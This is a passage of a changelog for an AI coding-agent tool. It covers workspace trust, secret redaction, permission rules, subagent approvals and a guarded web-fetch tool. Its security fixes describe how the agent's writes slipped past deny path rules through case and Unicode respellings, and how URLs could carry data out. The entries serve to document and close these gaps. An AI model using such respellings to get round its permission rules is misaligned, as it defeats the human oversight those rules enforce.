  - empty (0 bytes), as `touch ~/.abhed/secrets.json` leaves it: write `{}`
    to it or delete it;
  - not valid JSON, over 1 MiB, or not a regular file: fix it, or remove it
    and add the secrets again with `abhed secret set`.
- An editor using `abhed acp`, and a CI job running `abhed rpc` or
  `abhed resolve`, now fails at start over such a store where it used to
  run. The editor's log or the job's output shows the message.
- Embedders:
  - `sdk.New` can return this error.
  - `Approve` now receives the arguments, reason and scope with stored
    values redacted.
  - What `Run`, `RunJSON` and `RunStructured` return is redacted. A redacted
    structured answer may no longer match a `pattern`, `enum` or length in
    the caller's schema, and one whose redaction fails comes back as
    `{"withheld": ...}`, which will not decode into the caller's type.
  - A program that builds `server.Options` or an `agent.SubagentFactory`
    without `Redact` now redacts.
- `abhed secret set` refuses a value under 8 characters. Values already
  stored keep working.
- SDK: a `ConfigDir` file is untrusted in the same way, so an embedding
  program that keeps its providers, MCP servers or extensions there loses
  them, with a line on stderr (or, for the model, an error from `New`),
  until it trusts the file. Set
  `Options.WorkspaceTrust` to `config.TrustGranted` when the program owns
  that file, or trust it once with `abhed trust grant`.
  `Agent.WorkspaceTrust()` reports the decision and what was ignored. When
  the ignored settings include the model and no `Options.Provider` is given,
  `New` returns `ErrUntrustedModel` instead of running on another model;
  set `Options.AllowDefaultModel` to run on the default anyway.
- A permission rule that does not parse now stops every command from
  loading the configuration. `serve` and `resolve` used to drop it, and every
  rule after it in the same list, without a word. Check with `abhed doctor`
  before restarting a server, so a bad rule is found before it refuses to start.
- The default configuration asks before a bash command that mentions
  `ABHED_TRUST_WORKSPACE` or `trust-workspace`. A configuration that sets
  its own `permissions.ask` list replaces these.
- `abhed init` trusts the file it writes. After an edit, trust it again.
- Tool calls whose arguments repeat a key, spell a key two ways, or carry an
  argument policy reads that the tool does not declare are now refused at
  step `args`, and the model is asked to retry. Extra keys the built-in
  tools do not take, such as `timeout` on `bash` or `file_path` on `read`,
  are dropped rather than refused and listed in the request's
  `dropped_args`. An MCP or extension tool whose schema sets
  `additionalProperties: false` now has undeclared keys refused.
- `action.requested` gains `raw_args` and `dropped_args`.
- Skill pipelines (up to 1.2.1 only the CLI ran them): a tool step that
  policy would ask about is refused in `abhed -p` and anywhere else with no
  approver, so a CI job whose pipeline runs such steps needs allow rules for
  them. A pipeline that calls the `skill` tool, runs with no calling loop,
  or would start beneath another pipeline's step is refused, and the skill
  falls back to its instructions.
  A step's timeout now starts after its approval.
- `k8s_login` no longer accepts a token, and `ssh_connect` no longer accepts
  `password_env`. Store the credential once on the machine Abhed runs on,
  add a rule for it, and give the agent its name:
  ```
  abhed secret set OCP_TOKEN
  "allow": ["secret(OCP_TOKEN)"]
  ```
  Then ask the agent to log in to the cluster by name. A token pasted into
  a chat is still in that message's record; store it instead. On `abhed
  serve`, secrets are the operator's, so users ask the operator to store
  one, and any session on the deployment may name a secret the rules allow;
  a login made with it holds for that session only. Log in again in each
  new session, after `/clear`, `/resume` or a fork in the terminal, and
  after a server restart.
- `k8s_login` reaches only clusters declared in `k8s.clusters`, and takes
  `cluster` (a name) instead of `server`. With none declared it refuses.
  Declare each cluster people log in to, with its CA if the system roots do
  not verify it:
  ```json
  "k8s": {"clusters": [{"name": "prod",
                        "server": "https://api.prod.example.com:6443",
                        "ca_file": "/etc/abhed/prod-ca.pem"}]}
  ```
  A cluster whose certificate verified nothing before, such as an OpenShift
  lab with a self-signed CA, now fails the login with a certificate error
  until its CA is configured, or until the operator sets
  `insecure_skip_tls_verify` on it. Clusters in an untrusted workspace
  `.abhed/config.json` are ignored. A configuration whose clusters repeat a
  name, leave one empty, or give a server that is not `https://`, or that
  carries a user or password, is refused when it loads.
- Rules on `k8s_login`, `k8s_get` and `k8s_apply` read the cluster first
  (see [Rules on a cluster](docs/ops/infrastructure.md#rules-on-a-cluster)).
  An allow rule written on the subject each tool had before (the namespace
  for `k8s_login`, the resource for `k8s_get`, the action for `k8s_apply`),
  such as `allow k8s_login(demo)` or `allow k8s_apply(scale)`, no longer
  approves anything; write `k8s_login(lab)` or `k8s_apply(lab/*/scale)`.
  Deny and ask rules written that way still apply. A `k8s.clusters` name holding `/`,
  `:`, `*` or `?` is refused when the configuration loads.
- `k8s_apply` refuses a manifest whose kind's scope Abhed does not know,
  custom resources included, since a rule could not tell whether it lands in
  a namespace. Apply those with `kubectl` through `bash`.
- After a login, `k8s_get` and `k8s_apply` given a kubeconfig `context` use
  the kubeconfig's own credential, not the login. Name the logged-in
  cluster as `cluster` instead. A session logged in to several clusters
  must name one on each call.
- A host added with `ssh_connect` is usable only in the session that added
  it, and a name used in `ssh.hosts`, in any case, cannot be reused for
  one, nor can a name that is not plain ASCII. A password
  needs the host's key in `known_hosts` first; connect once with `ssh`, or
  use a key file.
- `action.requested` gains `target`.
- A kubeconfig `exec` credential helper now runs when Abhed first sends a
  request to that cluster, not when the context is opened. `abhed doctor`
  and the `abhed serve` banner no longer run it, so a helper that fails is
  reported by the first cluster call instead.
- `abhed serve` now starts the configured extensions; their veto applies to
  every console and workbench session, and their tools are offered there.
- Embedders: `limits.max_budget_tokens`, `limits.max_tokens`,
  `context.compact_at` and `context.offload_at` now apply. With
  `Options.ConfiguredTools` the built-in prompt carries the workspace's
  `ABHED.md` memory files, as the CLI's does; without it, as before, it
  carries none. `abhed rpc` and `abhed acp` set it.
- SDK: `Agent.Fork` returns `ErrForkDuringRun` while `Run`, `Continue`,
  `RunJSON` or `RunStructured` is in progress. A fork ends the session's
  logins and rewrites the conversation, so it must come after the run returns.

### Fixed

- A command run in the container sandbox did not receive the secrets named in `secrets`, so it ran with them empty. They are now passed to the container by name; the value never appears in the container engine's arguments.
- The in-memory and Postgres event stores could panic the writer when a
  stream reader left at the moment an event was published.
- /ide offered every permission mode, though a session may start only in
  the server's mode or in plan, and after the server refused one the status
  bar still named it. The selector now offers only those two, as /console
  does, and a refusal puts it and the status bar back on the server's mode.
- A second /ide tab on a session whose run had ended asked the server every
  four seconds whether a new run had started, so a turn another tab began
  and finished in between was not drawn until a later one. The session
  state now carries its turn count, and a tab that sees it move reads the
  missed turn back from the record. It also asks every two seconds.
- /console kept a card answered in another tab open, with live buttons,
  after the run ended when its stream had gone. A 409 on an answer now
  reopens the stream, whose replay settles or retires the card, as /ide
  already did.
- `abhed serve` on Postgres could leave an event, such as a parallel
  subagent's `subagent.ask`, off an open `/events` stream. Parallel writers
  took their seq before writing, so a later seq could commit first; the
  stream read the record on the gap, moved past it, and then skipped the
  earlier one when it landed. A session's events are now written and
  published in seq order.
- `abhed rpc` and `abhed acp` ignored `limits.max_turns` from the user's and
  a trusted workspace's configuration, which bind the CLI and the server: a
  limit of 2 ran 16 turns. They now take it as the CLI does. An untrusted
  workspace can still only lower it, and a managed value stays the ceiling.
- `abhed rpc`: a `steer` sent while a prompt ran was read only after the run
  ended, so it never redirected it. Input is now read while a prompt runs. A
  `steer` goes to the session of the last `start` sent and is answered at
  once: `steered` when the running prompt will read it before its answer,
  `queued` when that session's next prompt will. A queued steer never read is
  named in an error line when the session ends. Any other request, a second
  `prompt` included, waits its turn and is answered in the order sent, up to
  256 waiting.
- `bash`: the note that the sandbox has no network was left off when a
  pipeline ended in success, as `curl … | head` does; it now follows the
  network failure whatever the exit code.
- A context over `compact_at` with nothing older than the kept turns recorded
  `compaction.started` with no `compaction.completed`. `started` is now
  recorded only when a summary is about to be written.
- A context whose only history older than the kept turns was the previous
  summary still recorded `compaction.started` with no completion, and paid
  for a summary it then threw away. One message is no longer summarised, so
  neither is recorded, and every `started` is followed by a `completed`. A
  `/compact` with nothing to summarise says so and records nothing; it
  recorded a `compaction.completed` of 0 tokens and counted it.
- Two `abhed user add` runs on Postgres, or two sign-ups, could both create
  the same account: the later replaced the first's password and email, and
  emails differing only in case were both accepted. An account is now created
  by an insert that fails on a username or email another account holds,
  without regard to case (schema version 5; see Upgrading).
- The CLI resumed an `unclaimed:` session when `$USER` was set to its owner
  string. An `unclaimed:` or `nobody:` session is now refused whatever
  `$USER` is.
- `GET /v1/sessions` read the tenant's 200 newest sessions and then kept the
  caller's, so a person whose sessions were all older listed none, though
  each opened. The owner is now filtered in the query. A session older than
  the newest 500 can now be continued too.
- With the secrets store unreadable mid-serve, an ask from the session's own
  agent was put to the approver with its record withheld; the workbench drew
  no card and the run waited until interrupted. Such an ask is now refused by
  the system, saying why, as a subagent's already was.
- An administrator got 404 replaying a scheduled run (scheduled runs come
  from the Team edition's schedules), which no identity owns. An administrator may now read one in their tenant by id (`replay`,
  `events`, `hawkeye`), never continue it, and each read is recorded as
  `session.read` in the admin audit.
- The admin Settings tab listed the shared tools and left out `recall`,
  `task` and `tasks`, which every session gets. It now lists what
  capabilities does.
- `bash`: the note that the sandbox has no network was added to successful
  output that only mentioned a network error, such as a log being read. A
  command that exits 0 now gets it only when a network client ran and the
  failure is in its last lines.
- Docs: `compact_at` below about 0.3 compacts on almost every turn
  (docs/guide/02-configuration.md).
- `abhed acp`: a permission request's `toolCallId` is now the id of the
  `tool_call` it asks about, and that `tool_call` is sent first. The id was
  derived from the tool name and argument length, so it matched no tool call
  and two calls could share it.
- `abhed acp`: an answer is bound to its request. An answer naming an option
  not offered for that call, including *Always allow* where it was withheld
  (which approved once before), is refused. A refused, cancelled or unreadable
  answer is recorded as refused by the system, not as a reviewer's rejection.
- `abhed acp`: a call the model wrote as prose, which has no call id, is
  named by its `requestId` in its `tool_call`, permission request and
  updates. Such calls all had the id `""`.
- The SDK's `RunJSON` and `RunStructured` never delivered a result: the loop
  runs on its own copy of the tool registry, and the `result` tool was added
  to the original, so every run ended with `ErrNoResult`. This dates from
  1.0.0.
- `bash` in SDK sessions, and so in `abhed rpc`, `abhed acp` and `abhed
  resolve`, could not use a stored secret: it answered "No secrets are
  configured on this deployment" and its description named none. It now
  reads the secrets store by name as the CLI's does, and each name still
  needs its own `secret(NAME)` allow rule.
- A second `/ide` tab stopped following a session once the run it opened
  into ended: a turn started from another tab, and its approval, never
  appeared in it, though its status bar still read connected. A page open
  on a session with no run now asks the server every few seconds and
  follows the next turn.
- The console's mode selector always started on `default`, and a server
  lets a client choose only its configured mode or `plan`, so on a server
  configured with another mode the first message was refused (403). It now
  starts on the configured mode and offers only it and `plan`.
- `abhed resolve` could close its session before it printed the agent's last
  messages, so they were lost. It now waits for them, as `rpc` and `acp` do.
- `abhed serve` did not start the configured extensions, so their veto did
  not apply to console or workbench sessions and their tools were missing.
- The SDK's `todo` tool recorded nothing, so an ACP editor's plan panel never
  updated. It now records `todo.updated` on every surface.
- The CLI's subagents spent from a budget of their own, apart from the
  session's, so `limits.max_budget_tokens` did not count their spend against
  the conversation and the conversation's against them. There is now one
  budget, and a subagent stops when it runs out rather than after.
- A subagent's `todo` list replaced its parent's; it is now kept in the
  subagent's own record.
- A skill reloaded in the server's settings reached the next session's
  prompt but not its `skill` tool, which kept the skills loaded at start.
- A CLI subagent's session row in Postgres did not name its parent, so it
  was listed as a session of user `agent`, and deleting the conversation
  left it behind.

### Added

- SDK: `Agent.Queued` counts steering messages not yet delivered, and
  `Agent.RunQueued` runs them when one arrived as the last run ended.
- SDK: `Options.ConfiguredLimits` takes `limits.max_turns` from the
  configuration, as the CLI does; `rpc` and `acp` set it. Embedders that leave
  it off keep today's behaviour: only a managed value binds, and a nonzero
  `Options.MaxTurns` wins over the files, below the managed ceiling.
- `abhed acp`: a permission request's `toolCall._meta["zybuu.ai/abhed"]`
  carries the `tool`, the policy `step`, `reason`, `destructive`, `scope` and
  `requestId`. `destructive` is true for any command with no undo, whichever
  step asked. The title, `rawInput` and reason shown are the recorded copy.
- SDK: `CallIDOf` and `RequestIDOf` name, inside `Options.Approve`, the call
  and the recorded request being asked about.
- `abhed trust` shows, grants, revokes and lists trust decisions;
  `abhed trust grant -sha256 H` grants only the content that was reviewed.
  `-trust-workspace` trusts the workspace file for one run.
- ACP `session/new` reports `_meta.abhed.workspaceTrust` and accepts
  `_meta.abhed.trust: "untrusted"`. The rpc `ready` event carries
  `workspace_trust`. The SDK adds `Options.WorkspaceTrust` and
  `Agent.WorkspaceTrust()`, and the config package adds `LoadWith`,
  `InspectWorkspace`, `GrantTrust`, `DeclineTrust`, `RevokeTrust`,
  `InitWorkspace`, `Printable`, `PrintableText` and `PrintableURL`.
- The record's `action.requested` carries `raw_args` (refused arguments as
  text) and `dropped_args` (keys a built-in tool dropped); the SDK's
  `ActionRequested` gains `RawArgs` and `Dropped`. Refusals of malformed
  arguments are recorded at the new policy step `args`.
- The record's `action.requested` carries `via` when the harness issued a
  call for the agent, such as `skill research pipeline`; the SDK's
  `ActionRequested` and HawkEYE's `calls[].via` show it, and an approval
  prompt names the pipeline that asks.
- Subagents (`task`, `tasks`) in the console and workbench, `abhed rpc`,
  `abhed acp` and the SDK, with the CLI's guarantees: the parent session's
  policy judges each call, the budget and `limits.max_parallel_subagents`
  are the session's, worktrees are made in the session's workspace, and
  `subagent.*` events are in the parent's record. A subagent's ask goes to
  whoever the session asks: the person in the console, on the parent
  session's prompt; the ACP editor's permission dialog; the SDK's `Approve`.
  With nobody to ask (an unattended server run, `rpc`, an SDK agent without
  `Approve`) it is refused. On a server with durable storage a subagent's
  session row is its parent's owner's, names the parent, and is not listed.
- `subagent.ask` in the parent's record: a subagent's call waiting on the
  approver, with the call, reason, scope and the `request_id` an answer
  names. Subagents running together are asked one at a time, and each ask is
  written when its turn comes. An ask that cannot be written there, because
  the parent's record refused the write or the request's payload was
  withheld, is not put to anyone: the call is denied by the system at step
  `ask`. `subagent.action` gains `request_id`.
- Skill pipelines run in console and workbench sessions, their steps put
  through the session's loop as from the CLI.
- SDK: `Options.ConfiguredTools` gives an embedded agent the CLI's tool set as
  the configuration enables it: subagents, MCP servers, extension tools,
  skills and pipelines, web search, the code index, rag corpora, Kubernetes
  and SSH. Off by default; `abhed rpc` and `abhed acp` turn it on.
- `abhed acp`: a subagent's ask is a permission request on a `tool_call`
  named `subagent-<request id>`, sent first, and its answer settles that call.
- `server.Options.Extensions` puts running extensions' veto and compaction
  summary on every session. The capabilities list names `task` and `tasks`,
  and gives each configured extension's `status` (`running`, `stopped` or
  `not started`); the serve banner names one that is not running.
- The console and workbench say on a subagent's approval card that *Always
  allow* covers the whole session, the agent and every subagent.
- `web_fetch`: reads one http or https page through Abhed, not the
  sandboxed shell, and returns its text (HTML reduced to headings,
  paragraphs, lists and links), in parts of up to `web_fetch.max_chars`
  characters. Off by default and enabled on its own with
  `web_fetch.enabled`; `web_fetch.allowed_hosts` limits it to named hosts.
  It refuses other schemes, any loopback, private, link-local, metadata or
  reserved address (checked where it connects, on every redirect hop), a
  URL holding a stored secret in any case, and a URL not written in its one
  form: no surrounding spaces; a port as a plain number, the default left
  out; an address as four decimal numbers or compressed IPv6, never IPv4 as
  IPv6 or as one number, and no host ending in a number that is not an IPv4
  address; and no `.`, `..`, empty, dots-only or control-character path
  segment, raw or encoded, and no encoded slash. So a rule on a host or port
  cannot be stepped around by respelling it, nor a rule on a path prefix by
  dot, encoding or Unicode respellings; path rules still match
  case-sensitively and a query exactly as written. `web_fetch(http*://host/*)`
  covers both schemes. A redirect to anything but the same URL (or its
  https upgrade) is handed back as a new call. Policy rules match the URL:
  `url` is now a subject key.
- `web_fetch` asks by default. With no `allowed_hosts`, each call asks in
  the default, accept-edits, auto and plan modes unless an allow rule such
  as `web_fetch(https://docs.python.org/*)` matches, since a URL can carry
  data to any site; "always allow" is offered for any URL on the site.
  Bypass (unless a managed policy disables it) runs it, a run with no one to
  ask refuses it, and `abhed eval`, which approves every ask, fetches. With
  `allowed_hosts` set, calls to those hosts do not ask on the scheme's
  default port; a URL naming another port asks.
- Subagents in the console, `abhed rpc`, `abhed acp` and the SDK use the
  cluster logins and connected hosts of the session that started them,
  never another session's. The SDK's `Close`, a new `start` on `abhed rpc`
  and the end of an `abhed acp` connection close the ones an embedded agent
  made.
- `subagent.ask` carries the subagent's `target`: where its call sends a
  credential, as the subagent's own `action.requested` names it.
- SDK: `Options.Warn` receives what the tool set skipped or found unsafe as
  it was built: an MCP server or extension that did not start, a cluster or
  host that skips verification. `abhed rpc` and `abhed acp` write these to
  stderr, as the terminal does; their stdout stays the protocol.

### Changed

- The CLI, the server, `rpc`, `acp`, `eval` and the SDK build their tools,
  system prompt, loop settings and budget in one place, so a surface differs
  from the CLI only where it says why. The server now applies
  `limits.max_tokens`. `abhed eval` runs with memory files, the `todo` list
  and subagents, and without MCP servers, extensions, rag corpora, the code
  index, Kubernetes and SSH, so a score does not depend on what those reach.
- `/resume` and the console refuse a subagent's session id; its work goes on
  through the session that started it. The CLI names that session when the
  record carries it, and the console answers as for an unknown session.
- A skill pipeline's input is the request its own loop is answering, and its
  model steps run on that loop's current model. It was the last CLI prompt,
  process-wide, and the model the CLI started with.
- `bash`'s description says whether commands can reach the network. When
  the sandbox has none and a command fails for that reason, the result ends
  with a note saying so and pointing at `web_search` and `web_fetch`. A
  model that ran `curl` in a sandbox with no network was given no reason
  for the failure.
- The system prompt names only the web tools the session has. It told the
  model to use `web_search` when search was off. `web_search`'s description
  pointed at a fetch tool that did not exist; it now names `web_fetch` when
  that is on.
- The CLI's and `eval`'s `bash` now know whether `sandbox.allow_network` is
  set, as the server's already did.
- `abhed serve` and `abhed doctor` report web fetch, and the console's
  overview shows it.

## [1.2.1] - 2026-09-28

### Upgrading

- Migrate first. Every deployment with two database roles, including one
  that signs in only through OIDC, must run `abhed migrate` as the owner
  before starting 1.2.1. The new column is `users.revocations`, a count of
  sign-outs everywhere, and the server refuses to start without it and says
  so. With a single role the server migrates itself. The migration is safe
  while 1.2.0 servers still run. Existing accounts start at 0.
- Cross-server sign-out needs every server on 1.2.1. A 1.2.0 server ignores
  the count during a rolling upgrade, so its sessions stay live.
- Mixed versions must not share one users file. A `users.json` file gains
  the count the first time an account in it is signed out everywhere; a
  1.2.0 server or `abhed user` command that rewrites the file drops it, and
  sessions it should end on other servers then stay live.
- A custom `auth.UserStore` must store `User.Revocations` and never lower it
  in `Put`. A sign-out everywhere through a store that does not keep it now
  returns an error instead of succeeding.
- `(*LocalAuth).RevokeUser` now writes to the account store, with a
  10-second limit of its own. `POST /v1/admin/users/admin` removing rights
  can answer `200` with a `warning` instead of `204` (see Changed).
- SDK: `SetModel` records the switch as a `model.switched` event and can now
  return an error when the record refuses it; the model is then left as it
  was. The new SDK exports are `EvModelCall`, `EvModelSwitched`, `ModelCall`
  and `ModelSwitched`.

### Added

All of it is additive. Records written before it resume on the model they
did; one that cannot say which of several providers it ran on now records
that it continues on the default (see Fixed).

- The record: a `model.switched` event (`provider`, `model`, `from`), a
  `model` field on `model.call`, and a `session.started` event (`origin`
  `chat`, `provider`, `model`, `mode`, `workspace`) at the start of every
  session the server starts, as workbench sessions already had.
- `GET /v1/sessions` gives each session's `model` and, while it is live on
  the server answering, its `provider`.
- `POST /v1/sessions/{id}/model` answers with `from` beside `provider` and
  `model`, and reopens a session this server does not hold instead of
  answering `404`.
- HawkEYE: `Report.Models` and `Turn.Model` (`models` and `turns[].model` in
  JSON), shown in the text, HTML and workbench views.
- The SDK: `EvModelCall`, `EvModelSwitched`, `ModelCall` and `ModelSwitched`.
- A model picker in the workbench. In it and in the console's, a model two
  configured providers serve is labelled `name · model`, and a switch note
  names the providers when the record does.
- In `auth`: `(*LocalAuth).RevokeUserContext`, which is `RevokeUser` that
  also returns an error when the sign-out could not be recorded for other
  servers; `User.Revocations`, which the account stores keep (never lowered
  by a write) and which is not sent in API responses; `RevokingUserStore`, a
  store that raises the count in one step, which the memory, file and
  Postgres stores implement; `store.Postgres.AddRevocation`, the Postgres
  store's one-step raise; and `LocalAuth.Log`, where `RevokeUser` logs what
  it cannot return.

### Changed

- The model pickers and `GET /v1/providers` list only configured providers.
  The built-in `local` provider (Ollama) is listed only when it is the
  default or a configuration file names it; `-model local` still works.
  The listed providers are the only ones a session can be started on or
  switched to: the API answers `400` for any other, and a record naming one
  continues on the default and records the move. `config.Config.Offered`
  reports which providers are listed.
- `agent.Loop` gains `ManualRefused`, which records a person's action that a
  policy denial refused before it reached `ManualAs`.
- The guide says that `delete(...)` and `rename(...)` rules bind the
  Explorer, not `rm` or `mv` in the terminal or the agent's `bash`, which
  `bash(...)` rules judge, and the security posture no longer calls the
  server single-node: several servers can share one Postgres, with no
  automatic failover.
- `(*LocalAuth).RevokeUser` now writes to the account store, with a
  10-second limit of its own, and logs a failure to `LocalAuth.Log` (new;
  `slog.Default()` when unset) instead of returning it. A caller on a
  request path should use `RevokeUserContext` with the request's context.
- `POST /v1/admin/users/admin` removing rights answers `200` with
  `sessions_ended`, `"signed_out_everywhere": false` and a `warning` when
  the sign-out could not be recorded for other servers, instead of `204`;
  the audit detail then carries `revocation_error`. Success is still `204`.

### Fixed

- An Explorer change to a session another server is running answered `500`
  "the change could not be recorded" instead of `409` "the session is being
  continued elsewhere", as a save does. Nothing was changed either way.
- An Explorer change refused by a `write(...)` rule was not recorded, while
  one refused by a `delete(...)` rule was. The attempt (`mkdir`, `rename` or
  `delete`, with its paths) and the policy's denial are now in the record,
  and the reply is still `403`. On a server that is not running the
  session, which cannot record the refusal, it answers `409` "the session is
  being continued elsewhere", as a `delete(...)` refusal does, and any other
  failure to record the refusal answers `500`.
- Switching the model now takes effect everywhere. The console started a new
  chat on the default whatever the picker showed; a session continued from
  its record (after a restart, on another node, or opened again in the
  workbench) went back to the default model; subagents kept the model the
  CLI started with after `/model`; the system prompt went on naming the old
  model; and in the console a failed switch reset the picker to the default
  instead of the model in use. A session no longer held in memory can be
  switched rather than answering `404`. The workbench has the picker too.
- The record names the model that answered: each `model.call` carries
  `model`, a switch is recorded as `model.switched`, the Postgres session row
  and the session list follow the switch, the CLI records a session started
  after `/model` under the model chosen, and HawkEYE lists the models used.
  A switch that cannot be recorded is refused and says so.
- A chat started on a provider that serves the same model as the default
  (for example two gateways for `gpt-4o`) continued on the default after a
  restart, and nothing recorded the move. The record of every session the
  server starts now names its provider, and a continued session keeps it. A session
  whose recorded provider is no longer configured continues on the default,
  and its next turn records the move. So does a record from before this
  release, which names only a model, when no single configured provider
  serves that model, including the default's model when another provider
  serves it too.

### Security

- On a disk that ignores case (macOS and Windows by default), another
  spelling of a folder got past path rules: deleting `core/VAULT` or renaming
  `core/Vault` from the Explorer got past `delete(**/vault/**)`, making
  `ops/FROZEN/new` got past `write(**/frozen/**)`, and the agent's `write`
  got to `core/VAULT/x` past `write(**/vault/**)` and its `edit` past
  `edit(**/vault/**)`. Deny and ask path rules are now also matched against
  the path as the disk spells it: each part that exists under the name the
  disk holds, in case and Unicode form, and a part not made yet as given,
  under its folder's real name. Allow rules still compare case as written.
  `tools.DiskPath` gives that spelling. The fix is verified on macOS, where
  a CI job runs the case tests and fails if any skips; it builds for
  Windows, but no CI job runs it there yet.
- A deny or ask path rule whose name was written in another Unicode form
  than the disk holds protected nothing: `write(**/café/**)` pasted in NFD,
  as Finder copies a name, let a write into an NFC `café/` through. Deny and
  ask path patterns are now also compared with the pattern and the path both
  in NFC, which only adds matches. Allow patterns are compared as written,
  since on a disk that keeps Unicode form the two spellings are two
  folders. A pattern's case is still not folded: on macOS and Windows, write
  a path rule in the case the disk holds the name (see the permissions
  guide).
- A sign-out everywhere ended the person's sessions only on the server that
  handled the request. With several servers sharing one Postgres account
  store, their sessions on the others stayed live. In Community, removing
  administrator rights through `POST /v1/admin/users/admin` signs the person
  out everywhere; it covers local accounts, in a users file or Postgres, and
  `abhed user` commands in the CLI keep the count when they rewrite an
  account. The Team edition adds the admin page's "Sign out everywhere", a
  password reset from the admin page, and an account refused by the access
  gate, each through `auth.LocalAuth.RevokeUser`. The sign-out is now
  recorded with the account (a failure to record it is logged, and reported
  by `RevokeUserContext` and the admin-rights endpoint), and every server
  ends that person's older sessions on its next read of the account: on
  Postgres within `accountRecheck`, about 2 seconds, and with a users file
  as soon as the file changes. A sign-in after the sign-out is not affected.
  As before, a terminal or event stream already open is checked only when
  it opens.
- An administrator's password reset made while a read of the same account
  was in flight could have that read clear the new must-change flag on this
  server's live sessions until their next read. The reset now voids reads
  in flight, and a read that overlapped a change no longer sets the flag.

## [1.2.0] - 2026-09-28

### Upgrading

- Abhed refuses to start when a `.abhed` state file in any folder above the
  workspace, such as the repository root's `.abhed/config.json` for a run
  started in a subfolder, has a second name (a hard link). Above the
  workspace only `.abhed/users.json`, `config.json` and `secrets.json` that
  you own or can write count, and world-writable sticky folders such as
  `/tmp` are skipped, so another user's file there cannot block your start.
  Remove the extra name, or give the file a single name with
  `cp -p f f.new && mv f.new f`.
- A policy hook or extension screening the Explorer's `delete` and `rename`
  actions is now asked about every entry inside a folder (up to the walk's
  5,000 entries), not only the folder. A rename's old paths are also put to
  it as `delete` actions, since a rename removes them. After duplicates are
  dropped each entry is put up to 12 times for a folder rename (named and
  with links followed, with and without a trailing `/`, as a `rename` at the
  old and the new path and as a `delete` at the old) and up to 4 for a folder
  delete, so a large rename can mean about 60,000 policy decisions; a hook
  that makes a network call per decision makes it slow.
- `POST /logout` with `Accept: application/json` answers
  `200 {"next": "<where to go>"}` instead of the redirect, which is how the
  pages now sign out. A form post without that header still redirects.
- A `403` from `auth.Middleware.Check` (for example a member dropped from
  `auth.require_group`) carries `"refused": true` beside `error` and
  `reason`, and sets a short-lived `abhed_refused` cookie that holds the
  reason for the sign-in page. The body is no longer all strings: a client
  that decodes it into a string-only map (`map[string]string` in Go) must
  decode `refused` as a boolean or ignore it.
- A subagent (`task`, `tasks`) now asks whoever its parent asks. In the
  interactive CLI its destructive commands, ask-rule matches and default-mode
  asks come to your prompt, naming the subagent, one at a time when several
  subagents run; in
  `-p` they are refused as `headless`, as the parent's own would be. A
  scripted `-p` run that relied on a subagent running such a command must
  allow it with a rule, or run it in the parent. An "Always allow" chosen
  earlier in the session covers a subagent's calls too. With
  `limits.nested_subagents` off, the default, a subagent's own `task` or
  `tasks` call is refused.
- A relative path rule now matches. If you wrote one such as `write(docs/**)`
  and relied on it not firing, it will now refuse or ask; check your rules.
- On macOS and Windows, program names in `bash(...)` rules are compared
  without case, so `bash(Make test)` also allows `make test`.
- More git commands confirm in every mode: a subcommand git does not have,
  such as a repository alias or an extension like `git lfs`, any
  `git update-ref`, `git read-tree -u` and `git checkout-index -f`. In
  `bypass`, `auto` and under an allow rule these now ask, and no allow rule
  or scope can approve them; headless `-p` refuses them.
- An allow path rule matches only where a call lands, so `write(notes/**)`
  no longer allows a path in `notes/` that is a link elsewhere, and a
  relative allow rule applies to the workspace only, not added directories.
- For the same reason, an absolute allow rule written with a spelling that
  resolves elsewhere now asks: `/var/…` or `/tmp/…` on macOS (which resolve
  to `/private/…`), or a project reached through a link. This only
  tightens; write the rule with the resolved path.
- In `plan` mode, a destructive or ask-rule command is refused as plan mode
  instead of being put to you.
- The interactive CLI keeps one conversation, and one session record, across
  the tasks you type, as `/model`, `/fork` and the docs already said: a later
  task sees what was said before it. The turn limit now counts the whole
  conversation, and the CLI says so when a task hits it; `/clear` starts a
  new conversation and a new session, and `/cost`, `/diff` and `/undo` start
  over with it.
  `/resume <id>` now continues the session's conversation, where it used to
  only replay it, and `/export`, `/tree` and `/hawkeye` cover every task in
  the session, not only the last. `/fork`, in the CLI and the SDK's
  `Agent.Fork`, records a `conversation.forked` event, so a later fork or
  resume does not bring back the branch it abandoned. For an SDK embedder
  this means `Agent.Fork` writes that event into their store, so `Events()`
  includes it, and it refuses a step an earlier fork abandoned or one past
  the end; `Fork(0)` still keeps the whole conversation.
- An unknown `-mode` exits 2, like any other bad invocation; it exited 1.
- The `write` tool now makes a new file's missing folders itself, so in
  `accept-edits` and `auto` a new file in a new folder no longer asks for a
  shell `mkdir`. A policy that relied on `write` being unable to create
  folders should add a `write(...)` deny or ask rule for those paths.
- Upgrade every node that shares one Postgres database together. An older
  node does not know `conversation.forked`, `observation.not_run` or the
  claim rules below, so it can rebuild a branch a fork abandoned, count calls
  that never ran, or reopen a session only being viewed.
- The interactive CLI names each new session `s-` and 24 random hex digits,
  where it used `s-<unix seconds>-<task>`; a script that parsed the old form
  should treat the id as opaque. On Postgres, creating a session whose id is
  already recorded is now an error (`store.ErrSessionExists`), and so is
  writing a different event at a step another writer already recorded; a
  replay of the same event still succeeds. That second error is
  `store.ErrStepTaken`, and the memory store (and so the SDK) now refuses
  such an append the same way. `abhed -p` also uses a random session id and
  exits 1 when it cannot record its session.
- A resumed session's `session.ended` totals (`tokens_in`, `tokens_out`,
  `tokens_cached`, `compactions`) now go on from its record, as `turns`
  already did, in the CLI and when the server continues a session; they
  restarted from zero.
- On the process tier a command or workbench shell can start at most
  `sandbox.max_procs` (512 by default) more processes than your user already
  runs; a build that needs more, such as a very wide `make -j`, fails to
  fork past it. Raise `max_procs` if it does.
- The Explorer's New folder, rename and delete are recorded as `mkdir`,
  `rename` and `delete` actions instead of `bash` calls, and `bash(...)`
  rules no longer apply to them. To stop a delete from the Explorer, write a
  rule for the action, such as `delete(**/keep/**)`, which also stops a
  rename of `keep` or a move out of it, or a `write(...)` rule on the path.
  A policy hook or extension that screened these as `bash`
  calls now sees `mkdir`, `rename` or `delete`, with the path in `path`
  (and a rename's new name in `to`).
- Isolated subagents (`tasks` with `"isolation": "worktree"`) and
  `abhed resolve` now make their worktrees in `<repository>/.abhed-worktrees/`
  instead of `.abhed/worktrees/`, and add `/.abhed-worktrees/` to
  `.git/info/exclude`. Worktrees left under `.abhed/worktrees/` by an earlier
  version are no longer used; remove them with `git worktree remove --force
  <path>` (or delete the folder and run `git worktree prune`) and delete their
  `abhed/<id>` or `abhed/issue-<n>` branches.
- Abhed no longer starts when a state file (`.abhed/config.json`,
  `users.json`, the secrets file, or another file under `.abhed/`) has more
  than one name. Find the other name with `find / -xdev -samefile <file>` and
